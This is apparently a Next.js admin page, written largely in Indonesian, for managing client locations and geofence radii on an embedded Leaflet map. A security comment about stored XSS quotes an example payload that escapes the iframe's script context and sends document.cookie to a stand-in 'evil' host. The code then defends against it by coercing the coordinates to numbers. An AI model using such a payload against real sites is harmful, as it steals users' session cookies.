"use client";
import React, { useState, useEffect } from "react";
import { lokasiApi, clientsApi } from "@/lib/api";
import { fmtDate, statusColor, statusLabel } from "@/lib/formatters";
import { Modal } from "@/components/ui/Modal";
import { Pagination } from "@/components/ui/Pagination";
import { ConfirmDialog } from "@/components/ui/ConfirmDialog";
import { useToast } from "@/hooks/useToast";

export default function LokasiPage() {
  const { toast } = useToast();
  const [loading, setLoading] = useState(true);
  const [data, setData] = useState<any[]>([]);
  const [klienUsers, setKlienUsers] = useState<any[]>([]);
  const [modal, setModal] = useState(false);
  const [edit, setEdit] = useState<any>(null);
  const [del, setDel] = useState<any>(null);
  const [saving, setSaving] = useState(false);
  const [search, setSearch] = useState("");
  const [form, setForm] = useState({
    nama: "",
    alamat: "",
    latitude: "-6.2088",
    longitude: "106.8456",
    radius: "500",
    status: "active",
    client_id: "",
  });
  const [currentPage, setCurrentPage] = useState(1);
  const PAGE_SIZE = 15;
  const load = async () => {
    setLoading(true);
    try {
      try {
        const d = await lokasiApi.list();
        setData(Array.isArray(d) ? d : []);
      } catch {}
      try {
        const u = await clientsApi.list();
        setKlienUsers(Array.isArray(u) ? u : []);
      } catch {}
    } finally {
      // BUG #4 (P2-2): always clear loading, even on unexpected error.
      setLoading(false);
    }
  };
  useEffect(() => {
    load();
  }, []);
  // [Audit 2B] Reset ke halaman 1 saat kata kunci berubah (sebelumnya bisa
  // terjebak di halaman kosong).
  useEffect(() => { setCurrentPage(1); }, [search]);
  useEffect(() => {
    const h = (e: MessageEvent) => {
      if (e.data?.t === "lok-map")
        setForm((f: any) => ({
          ...f,
          latitude: e.data.lat,
          longitude: e.data.lng,
        }));
    };
    window.addEventListener("message", h);
    return () => window.removeEventListener("message", h);
  }, []);
  const openNew = () => {
    setEdit(null);
    setForm({
      nama: "",
      alamat: "",
      latitude: "-6.2088",
      longitude: "106.8456",
      radius: "500",
      status: "active",
      client_id: "",
    });
    setModal(true);
  };
  const openEdit = (r: any) => {
    setEdit(r);
    setForm({
      nama: r.nama,
      alamat: r.alamat,
      latitude: String(r.latitude),
      longitude: String(r.longitude),
      radius: String(r.radius || 500),
      status: r.status,
      client_id: r.client_id ? String(r.client_id) : "",
    });
    setModal(true);
  };
  const handleKlienSelect = (klienId: string) => {
    const kl = klienUsers.find((k) => String(k.id) === klienId);
    if (kl)
      setForm((f) => ({ ...f, nama: kl.nama_klien, client_id: String(kl.id) }));
    else setForm((f) => ({ ...f, client_id: "" }));
  };
  const save = async () => {
    if (saving) return;
    const nama = form.nama.trim();
    const alamat = (form.alamat || "").trim();
    const lat = parseFloat(form.latitude);
    const lng = parseFloat(form.longitude);
    const radius = parseInt(form.radius) || 500;
    if (nama.length < 3) return toast("Nama lokasi minimal 3 karakter", "warning");
    if (!alamat) return toast("Alamat wajib diisi", "warning");
    if (!Number.isFinite(lat) || lat < -90 || lat > 90) return toast("Latitude tidak valid (-90 s/d 90)", "warning");
    if (!Number.isFinite(lng) || lng < -180 || lng > 180) return toast("Longitude tidak valid (-180 s/d 180)", "warning");
    if (radius < 50 || radius > 5000) return toast("Radius geofence harus 50–5000 meter", "warning");
    // [Audit 2B] clients.id adalah UUID (migrasi 003). parseInt(uuid) menghasilkan
    // angka acak/NaN → simpan lokasi dengan klien SELALU gagal (400/500). Kirim apa
    // adanya sebagai string; null bila kosong.
    const payload: any = {
      nama,
      alamat,
      latitude: lat,
      longitude: lng,
      radius,
      status: form.status,
      client_id: form.client_id || null,
    };
    setSaving(true);
    try {
      if (edit) {
        await lokasiApi.update(edit.id, payload);
        toast("Lokasi berhasil diperbarui");
      } else {
        await lokasiApi.create(payload);
        toast("Lokasi baru berhasil ditambahkan");
      }
      setModal(false);
      load();
    } catch (e: any) {
      toast(e.message, "error");
    } finally {
      setSaving(false);
    }
  };
  const doDelete = async () => {
    if (saving) return;
    setSaving(true);
    try {
      await lokasiApi.del(del.id);
      toast("Lokasi berhasil dihapus");
      setDel(null);
      load();
    } catch (e: any) {
      toast(e.message, "error");
    } finally {
      setSaving(false);
    }
  };
  const filtered = data.filter(
    (r) =>
      !search ||
      r.nama?.toLowerCase().includes(search.toLowerCase()) ||
      r.alamat?.toLowerCase().includes(search.toLowerCase()),
  );
  const pagedData = filtered.slice((currentPage - 1) * PAGE_SIZE, currentPage * PAGE_SIZE);
  return (
    <div>
      <div className="page-header">
        <h1 className="page-title">
          <i className="fas fa-building" />
          Lokasi / Klien
        </h1>
        <button className="btn btn-primary" onClick={openNew}>
          <i className="fas fa-plus" /> Tambah Lokasi
        </button>
      </div>
      <div className="section-card">
        <div className="filters-row">
          <div className="search-box">
            <i className="fas fa-search" />
            <input
              placeholder="Cari lokasi..."
              value={search}
              onChange={(e) => setSearch(e.target.value)}
            />
          </div>
          <span className="muted">{filtered.length} lokasi</span>
        </div>
        <table>
          <thead>
            <tr>
              <th>Nama Lokasi</th>
              <th>Klien</th>
              <th>Alamat</th>
              <th>Koordinat</th>
              <th>Radius</th>
              <th>Status</th>
              <th>Dibuat</th>
              <th>Aksi</th>
            </tr>
          </thead>
          <tbody>
            {loading && data.length === 0 ? (
              // BUG #4 (P2-3): skeleton while initial fetch is in flight.
              Array.from({ length: 5 }).map((_, i) => (
                <tr key={`skel-${i}`}>
                  <td colSpan={8}>
                    <div
                      className="animate-pulse"
                      style={{
                        background: "var(--hover-row, #e5e7eb)",
                        height: 40,
                        borderRadius: 6,
                      }}
                    />
                  </td>
                </tr>
              ))
            ) : (
              <>
                {pagedData.map((r) => {
                  const kl = klienUsers.find((k) => String(k.id) === String(r.client_id));
                  return (
                    <tr key={r.id}>
                      <td className="cell-ellipsis" title={r.nama}>
                        <strong>{r.nama}</strong>
                      </td>
                      <td>
                        {kl ? (
                          <span className="badge badge-info">{kl.nama_klien}</span>
                        ) : (
                          <span className="muted">-</span>
                        )}
                      </td>
                      <td className="cell-ellipsis-lg" title={r.alamat}>{r.alamat}</td>
                      <td style={{ fontFamily: "monospace", fontSize: 12 }}>
                        {r.latitude?.toFixed?.(4)}, {r.longitude?.toFixed?.(4)}
                      </td>
                      <td>
                        <strong>{r.radius || 500}m</strong>
                      </td>
                      <td>
                        <span className={`badge badge-${statusColor(r.status)}`}>
                          {statusLabel(r.status)}
                        </span>
                      </td>
                      <td>{fmtDate(r.created_at)}</td>
                      <td>
                        <div className="btn-group">
                          <button
                            className="btn-icon"
                            title="Edit"
                            onClick={() => openEdit(r)}
                          >
                            <i className="fas fa-pen" />
                          </button>
                          <button
                            className="btn-icon"
                            title="Hapus"
                            onClick={() => setDel(r)}
                            style={{ color: "var(--danger)" }}
                          >
                            <i className="fas fa-trash" />
                          </button>
                        </div>
                      </td>
                    </tr>
                  );
                })}
                {filtered.length === 0 && (
                  <tr>
                    <td colSpan={8} className="empty-row">
                      Tidak ada data lokasi
                    </td>
                  </tr>
                )}
              </>
            )}
          </tbody>
        </table>
      <Pagination currentPage={currentPage} totalItems={filtered.length} pageSize={PAGE_SIZE} onPageChange={setCurrentPage} />
      </div>
      {modal && (
        <Modal
          title={edit ? "Edit Lokasi" : "Tambah Lokasi"}
          onClose={() => !saving && setModal(false)}
          footer={
            <>
              <button
                className="btn btn-outline"
                onClick={() => setModal(false)}
                disabled={saving}
              >
                Batal
              </button>
              <button className="btn btn-primary" onClick={save} disabled={saving}>
                <i className={`fas ${saving ? "fa-spinner fa-spin" : "fa-save"}`} /> {saving ? "Menyimpan..." : "Simpan"}
              </button>
            </>
          }
        >
          <div className="form-group">
            <label className="form-label">Pilih Klien <small className="muted">(opsional — mengisi nama otomatis)</small></label>
            <select
              className="form-select"
              value={form.client_id}
              onChange={(e) => handleKlienSelect(e.target.value)}
            >
              <option value="">-- Tanpa Klien --</option>
              {klienUsers.map((k) => (
                <option key={k.id} value={k.id}>
                  {k.nama_klien} ({k.kode_klien})
                </option>
              ))}
            </select>
          </div>
          <div className="form-group">
            <label className="form-label">Nama Lokasi *</label>
            <input
              className="form-input"
              value={form.nama}
              onChange={(e) => setForm({ ...form, nama: e.target.value })}
              placeholder="Nama lokasi / perusahaan klien"
            />
          </div>
          <div className="form-group">
            <label className="form-label">Alamat *</label>
            <textarea
              className="form-textarea"
              value={form.alamat}
              onChange={(e) => setForm({ ...form, alamat: e.target.value })}
            />
          </div>
          <div className="form-group">
            <label className="form-label">
              📍 Pilih Lokasi di Peta (klik pada peta)
            </label>
            <div
              style={{
                border: "1px solid var(--border)",
                borderRadius: 8,
                overflow: "hidden",
                height: 280,
                marginTop: 4,
              }}
            >
              {/*
                SECURITY (Stored XSS, Tahap 3):
                The lat/lng inputs on this page are plain text inputs
                (not type="number"), so an admin can type literally
                anything — including a payload that breaks out of the
                JS expression context in the iframe srcDoc below:
                  -0.5);fetch('https://evil/'+document.cookie);//
                Coerce to a finite Number at the point of
                interpolation so the iframe never sees a non-numeric
                value. Defense in depth — parseFloat on save and the
                float DB column already provide upstream protection,
                but the iframe shouldn't depend on them.
              */}
              {(() => {
                const num = (v: any, def: number) => {
                  const n = Number(v);
                  return Number.isFinite(n) ? n : def;
                };
                const la = num(form.latitude, 0);
                const ln = num(form.longitude, 0);
                const r = num(form.radius, 500);
                return (
                  <iframe
                    title="lok-map"
                    style={{ width: "100%", height: "100%", border: "none" }}
                    srcDoc={`<!DOCTYPE html><html><head><link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/><script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"><\/script><style>body{margin:0}#m{height:100vh}</style></head><body><div id="m"></div><script>var la=${la},ln=${ln},r=${r};var m=L.map('m').setView([la||-0.5,ln||101.4],la?14:5);L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{maxZoom:19}).addTo(m);var mk=null,ci=null;function up(a,b){if(mk)m.removeLayer(mk);if(ci)m.removeLayer(ci);mk=L.marker([a,b]).addTo(m);ci=L.circle([a,b],{radius:r,color:'#3388ff',fillOpacity:0.12}).addTo(m)}if(la&&ln)up(la,ln);m.on('click',function(e){up(e.latlng.lat,e.latlng.lng);window.parent.postMessage({t:'lok-map',lat:e.latlng.lat.toFixed(6),lng:e.latlng.lng.toFixed(6)},'*')})<\/script></body></html>`}
                  />
                );
              })()}
            </div>
          </div>
          <div className="form-row">
            <div className="form-group">
              <label className="form-label">Latitude</label>
              <input
                className="form-input"
                value={form.latitude}
                onChange={(e) => setForm({ ...form, latitude: e.target.value })}
              />
            </div>
            <div className="form-group">
              <label className="form-label">Longitude</label>
              <input
                className="form-input"
                value={form.longitude}
                onChange={(e) =>
                  setForm({ ...form, longitude: e.target.value })
                }
              />
            </div>
          </div>
          <div className="form-group">
            <label className="form-label">Radius Geofence (meter)</label>
            <input
              type="number"
              className="form-input"
              value={form.radius}
              onChange={(e) => setForm({ ...form, radius: e.target.value })}
              min="50"
              max="5000"
            />
          </div>
          <div className="form-group">
            <label className="form-label">Status</label>
            <div className="form-chip-row">
              {["active", "inactive"].map((s) => (
                <button
                  key={s}
                  className={`form-chip ${form.status === s ? "active" : ""}`}
                  onClick={() => setForm({ ...form, status: s })}
                >
                  {statusLabel(s)}
                </button>
              ))}
            </div>
          </div>
        </Modal>
      )}
      {del && (
        <ConfirmDialog
          busy={saving}
          title="Hapus Lokasi?"
          msg={`"${del.nama}" akan dihapus permanen. Pastikan tidak ada personil, pos jaga, checkpoint, atau jadwal yang masih terikat ke lokasi ini.`}
          onConfirm={doDelete}
          onCancel={() => setDel(null)}
        />
      )}
    </div>
  );
}
